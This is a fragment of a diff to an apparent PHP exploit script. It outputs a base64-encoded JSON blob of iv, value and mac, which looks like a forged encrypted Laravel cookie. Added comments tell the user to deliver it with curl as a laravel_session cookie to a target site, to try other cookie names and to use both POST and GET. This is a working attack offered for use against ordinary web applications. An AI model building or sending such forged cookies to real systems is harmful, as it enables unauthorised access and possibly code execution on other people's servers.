@@ -19,3 +19,7 @@ $json = json_encode(compact('iv', 'value', 'mac'));
 
 // Print the results
 die(urlencode(base64_encode($json)));
+
+# execute the command below. laravel_session might be something else, try all. Send also both post and get requests
+# curl -H "Cookie: laravel_session=$(php foo.php);" -v http://example.com
+
